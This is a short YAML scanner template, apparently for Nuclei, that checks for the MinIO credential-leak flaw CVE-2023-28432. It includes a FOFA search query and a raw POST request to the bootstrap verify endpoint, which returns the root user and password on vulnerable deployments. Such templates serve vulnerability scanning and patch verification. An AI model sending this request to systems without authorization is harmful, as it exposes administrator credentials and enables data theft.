id: CVE-2023-28432

info:
  name: MinIO 信息泄露未授权访问(CVE-2023-28432)
  author: wintry
  severity: high
  description: |
    MinIO 存在信息泄露漏洞给. 在RELEASE.2019-12-17T23-16-33Z 和 RELEASE.2023-03-20T20-16-18Z之前的集群部署中.
    MinIO返回所有环境变量,包括MINIO_SECRET_KEY和MINIO_ROOT_PASSWORD.
    攻击者可以在不输入必要凭证的情况下获取敏感信息、修改数据和/或执行未经授权的操作,影响分布式部署的所有用户.
  remediation: 升级到 RELEASE.2023-03-20T20-16-18Z 版本.
  metadata:
    max-request: 1
    fofa-query: app="Minio"
    verified: "true"
  tags: minio

http:
  - raw:
      - |+
        POST /minio/bootstrap/v1/verify HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"MINIO_ROOT_PASSWORD":'
          - '"MINIO_ROOT_USER":'
        condition: and

      - type: word
        part: header
        words:
          - 'text/plain'

      - type: status
        status:
          - 200
